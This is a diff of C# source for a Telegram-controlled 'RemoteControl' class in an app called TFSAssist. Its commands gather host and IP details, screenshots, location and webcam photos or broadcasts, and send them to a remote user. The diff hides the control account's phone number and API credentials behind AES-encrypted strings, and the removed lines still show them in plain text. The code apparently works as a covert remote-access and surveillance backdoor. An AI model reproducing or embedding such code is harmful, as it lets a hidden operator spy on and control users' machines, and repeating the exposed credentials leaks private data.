@@ -15,48 +15,16 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using TeleSharp.TL;
-using TFSAssist.Control;
 using Utils;
 using Utils.AppUpdater;
 using Utils.Handles;
 using Utils.Telegram;
-using Utils.UIControls.Tools;
 using Utils.WinForm.MediaCapture;
 
-namespace TFSAssist
+namespace TFSAssist.RemControl
 {
-    public enum RemoteControlCommands
-    {
-        PING,
-        COMMANDS,
-        KILL,
-        INFO,
-        LOG,
-        DRIVE,
-        SCREEN,
-        CPU,
-        RESTART,
-        UPDATE,
-        LOC,
-        CAMINFO,
-        CAMSETT,
-        ACAM,
-        ECAM,
-        BROADCAST,
-        STOPCAM,
-        PHOTO
-    }
-
     public class RemoteControl : IDisposable
     {
-        class TTLControl : TLControl
-        {
-            public TTLControl(int appiId, string apiHash) : base(appiId, apiHash)
-            {
-
-            }
-        }
-
         public Thread MainThread { get; }
 
         private readonly string ClientID;
@@ -89,7 +57,10 @@ namespace TFSAssist
             private set => _tempDir = value;
         }
 
-        private const string HOST_PHONE_NUMBER = "+375333866536";
+        // PRIVATE DATA!!!
+        private const string KEY = nameof(TLControl);
+        // PRIVATE DATA!!!
+
         private static string HashCodeFilePath => Path.Combine(ASSEMBLY.ApplicationDirectory, TLControl.SessionName + ".hash");
         private static string AuthCodeFilePath => Path.Combine(ASSEMBLY.ApplicationDirectory, TLControl.SessionName + ".code");
 
@@ -141,7 +112,7 @@ namespace TFSAssist
                 IsEnabled = false;
 
                 _control?.Dispose();
-                _control = new TTLControl(770122, "8bf0b952100c9b22fd92499fc329c27e");
+                _control = new TTLControl(int.Parse(Utils.Crypto.AES.DecryptStringAES("EAAAANgw9/AN5XtERxX5Rjl1v2dxWpc1kbN7Pz8zMSNvduOj", KEY)), Utils.Crypto.AES.DecryptStringAES("EAAAAKUDZalqO6zA+3GkNaXYWGjBAIKeXdCshPO6fuf2tL4xIt7gaXd49TZY3isKaXi3lECRYUynr/qZQl0WDiHeYfg=", KEY));
                 await _control.ConnectAsync();
 
                 IsEnabled = true;
@@ -153,30 +124,42 @@ namespace TFSAssist
                     try
                     {
                         string hash;
+                        string code;
+                        string phone_number = Utils.Crypto.AES.DecryptStringAES("EAAAAPVCk/v9pGIyjaouvJTkkvBJMYMHxz3Nh8r3Q+oQAel+", KEY);
+
+                        // если уже существуют файл с хэшом
                         if (File.Exists(HashCodeFilePath))
                         {
-                            hash = await DecryptData(HashCodeFilePath); // раскодировать
-                            File.Delete(HashCodeFilePath);
+                            hash = await DecryptFileData(HashCodeFilePath); // раскодировать хэш
+
+                            if (File.Exists(AuthCodeFilePath)) // если уже существуют файл c полученным кодом, то забираем код
+                                code = await DecryptFileData(AuthCodeFilePath); // раскодировать код
+                            else // если файла с кодом еще нет, то будем ждать появления кода по текущему хэшу
+                                code = await getAuthCode.Invoke();
                         }
                         else
                         {
-                            hash = await _control.SendCodeRequestAsync(HOST_PHONE_NUMBER);
-                            var cryptHash = Utils.Crypto.AES.EncryptStringAES(hash, nameof(TLControl));
-                            var encryptHash = Utils.Crypto.AES.DecryptStringAES(cryptHash, nameof(TLControl));
-                            await SaveFile(HashCodeFilePath, cryptHash); // закодировать хэш
+                            hash = await _control.SendCodeRequestAsync(phone_number);
+                            var cryptHash = Utils.Crypto.AES.EncryptStringAES(hash, KEY); // закодировать хэш
+                            await SaveFile(HashCodeFilePath,
+                                cryptHash); // созраняем файл с хэшом, т.к. если перезагрузится приложение в то время как будем ждать код - хэш потеряется и мы отправим запрос на получение нового кода по новому хэшу. Поэтому заново запрашивать код нельзя
+                            code = await getAuthCode.Invoke(); // ждем появления файла с кодом
                         }
 
-                        var code = await getAuthCode.Invoke();
+                        // если успешно получили файл с кодом, то можно удалять файл с хэшом и файл с кодом, т.к. они больше не пригодятся
+                        File.Delete(HashCodeFilePath);
+                        File.Delete(AuthCodeFilePath);
 
-                        await _control.MakeAuthAsync(HOST_PHONE_NUMBER, hash, code);
+                        await _control.MakeAuthAsync(phone_number, hash, code);
 
                         //await _control.AuthUserAsync(getAuthUserCode, "+375333866536");
-                        await Connect(null);
+                        await Connect(null); // не передаем метод по получению кода, т.к. что то было сделанно не корреткно и может произойти FloodException, что не желательно
                     }
                     catch (Exception ex2)
                     {
                         WriteExLog(ex2, false);
                     }
+
                     return;
                 }
 
@@ -209,9 +192,7 @@ namespace TFSAssist
                     await Task.Delay(5000);
                 }
 
-                result = await DecryptData(AuthCodeFilePath);
-
-                File.Delete(AuthCodeFilePath);
+                result = await DecryptFileData(AuthCodeFilePath); // раскодировать файл с кодом авторизации
             }
             catch (Exception)
             {
@@ -226,13 +207,13 @@ namespace TFSAssist
         /// </summary>
         /// <param name="fileDestination"></param>
         /// <returns></returns>
-        async Task<string> DecryptData(string fileDestination)
+        async Task<string> DecryptFileData(string fileDestination)
         {
             string result;
-            using (var stream = new StreamReader(AuthCodeFilePath))
+            using (var stream = new StreamReader(fileDestination))
             {
                 var res = await stream.ReadToEndAsync();
-                result = Utils.Crypto.AES.DecryptStringAES(res, nameof(TLControl));
+                result = Utils.Crypto.AES.DecryptStringAES(res, KEY);
             }
 
             return result;
@@ -289,7 +270,7 @@ namespace TFSAssist
             }
         }
 
-        internal void SendMessage(string message)
+        public void SendMessage(string message)
         {
             SendMessageToUserHost(message);
         }
@@ -368,7 +349,7 @@ namespace TFSAssist
                         }
                         strCommand = strCommand.Trim();
 
-                        if(!AllCommands.TryGetValue(strCommand, out var command))
+                        if (!AllCommands.TryGetValue(strCommand, out var command))
                             continue;
 
                         switch (command)
@@ -400,7 +381,7 @@ namespace TFSAssist
                                     whiteSpace = " " + new string('.', maxLenghtSpace - 10) + " ";
 
                                 detInfo.Append($"ExternalIP{whiteSpace}[{HOST.GetExternalIPAddress()}]\r\n");
-                                
+
 
                                 var det = HOST.GetDetailedHostInfo();
                                 if (det?.Count > 0)
@@ -438,7 +419,7 @@ namespace TFSAssist
                                     SendMessageToUserHost("Log is empty.");
                                     break;
                                 }
-                                else if (logs.Length <= 500) // если логов немного
+                                else if (logs.Length <= 800) // если логов немного
                                 {
                                     SendMessageToUserHost(logs);
                                     break;
@@ -589,7 +570,7 @@ namespace TFSAssist
                                         }
                                     }
 
-                                    if(exceptionCount > 0)
+                                    if (exceptionCount > 0)
                                         SendMessageToUserHost($"Errors=[{exceptionCount}]");
                                 }
 
@@ -609,7 +590,7 @@ namespace TFSAssist
 
                             case RemoteControlCommands.BROADCAST:
 
-                                if(_encoderCapture == null)
+                                if (_encoderCapture == null)
                                     break;
 
                                 if (options != null && options.Count > 0)
@@ -621,7 +602,7 @@ namespace TFSAssist
                                             _encoderCapture.StartBroadcast(port);
                                             break;
                                         }
-                                    }       
+                                    }
                                 }
 
                                 _encoderCapture.StartBroadcast();
@@ -882,9 +863,9 @@ namespace TFSAssist
             }
         }
 
-        
 
-        
+
+
 
         async Task InitTempSession()
         {
@@ -925,7 +906,7 @@ namespace TFSAssist
 
                     DeleteAllFilesInDirectory(tempDirPath);
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-                    
+
                 }
                 catch (Exception ex)
                 {
@@ -987,7 +968,6 @@ namespace TFSAssist
                 }
             }
         }
-
 
         void InitCamCapture(string projectDirPath)
         {
@@ -1091,7 +1071,7 @@ namespace TFSAssist
             lock (syncLog)
             {
                 pullLogs += _processingErrorLogs.ToString().Trim();
-                 _processingErrorLogs.Clear();
+                _processingErrorLogs.Clear();
             }
 
             return pullLogs;
